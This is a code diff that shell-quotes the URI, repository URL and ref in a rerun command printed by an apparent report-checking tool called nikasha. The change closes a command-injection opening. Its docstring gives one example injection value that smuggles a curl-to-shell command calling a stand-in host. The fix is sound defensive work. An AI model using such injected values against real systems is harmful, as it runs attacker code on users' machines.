@@ -35,6 +35,7 @@ Markdown. No clock, no randomness; ``Result.timings`` is never rendered.
 from __future__ import annotations
 
 import re
+import shlex
 import unicodedata
 from collections.abc import Callable, Iterable, Sequence
 from dataclasses import dataclass, replace
@@ -492,13 +493,18 @@ def _context_details(result: Result, env: Environment) -> list[str]:
 
 
 def rerun_command(result: Result) -> str:
-    """The `nikasha check` invocation that reproduces this result."""
-    parts = ["nikasha check", result.report.source.uri or "REPORT"]
+    """The `nikasha check` invocation that reproduces this result.
+
+    The URI, repository URL and ref are report-derived, and a maintainer will paste this
+    line into a shell, so each one is shell-quoted: a URI of ``x;curl evil|sh`` must stay
+    one argument, never become a second command (P7).
+    """
+    parts = ["nikasha check", shlex.quote(result.report.source.uri or "REPORT")]
     target = result.target
     if target is not None:
-        parts += ["--repo", target.repo_url]
+        parts += ["--repo", shlex.quote(target.repo_url)]
         if target.ref_name:
-            parts += ["--ref", target.ref_name]
+            parts += ["--ref", shlex.quote(target.ref_name)]
     return " ".join(parts)
 
 
